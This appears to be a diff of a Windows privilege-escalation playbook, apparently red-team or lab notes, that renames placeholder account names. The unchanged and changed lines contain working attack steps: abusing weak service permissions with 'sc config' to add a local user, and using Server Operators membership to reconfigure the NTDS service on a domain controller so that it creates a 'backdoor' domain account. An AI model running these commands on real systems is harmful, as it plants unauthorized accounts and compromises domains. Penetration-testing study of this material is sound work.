@@ -81,7 +81,7 @@ sc start VulnService
 **Steps:**
 ```cmd
 accesschk.exe -uwcqv "Authenticated Users" *
-sc config VulnSvc binPath= "cmd /c net user attacker P@ss /add"
+sc config VulnSvc binPath= "cmd /c net user loki P@ss /add"
 sc start VulnSvc
 ```
 **Detection:** Event `7040`.
@@ -452,7 +452,7 @@ Track Patch Tuesday.
 
 ### PE-057 — Server Operators → SYSTEM on DC
 **What it is:** members of Server Operators on a DC can `sc.exe config` any service → next start = SYSTEM. The classic "tier-0-by-accident" group.
-**Why it works here:** `helpdesk` in Server Operators on DC01.
+**Why it works here:** `nick.fury` in Server Operators on DC01.
 **Steps:**
 ```cmd
 sc \\dc01 config NTDS binPath= "cmd /c net user backdoor P@ss /add /domain"
